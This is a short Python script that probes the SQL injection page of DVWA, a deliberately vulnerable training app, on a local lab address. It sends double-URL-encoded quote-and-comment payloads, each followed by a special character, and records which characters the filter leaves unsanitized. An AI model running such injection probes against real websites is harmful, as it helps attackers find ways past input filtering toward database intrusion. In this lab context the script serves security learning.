import requests
from urllib.parse import quote as enc

sc = " !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
level = "medium"

no_san = []
san = []
for c in sc:
	payload = f"1%2527%23{enc(c)}"
	url = f"http://10.0.2.5/dvwa/vulnerabilities/sqli/?id={payload}&Submit=Submit#"
	cookies = {'security':level,'PHPSESSID':'fcbd4e8e5eb26951c0c3c057f959a49e'}
	get = requests.get(url, cookies = cookies)
	res = get.text.split("pre>")[1][:-2]
	output = res.split("<br>")[0][4:]
	returned_c = output.split("1%27#")[1]
	if c == returned_c:
		no_san.append(c)
	else:
		san.append(c)

print(f"List of SANITIZED chars: {san}")
print(f"List of NOT sanitized chars: {no_san}")
print(f"Number of packets sent: {len(sc)}")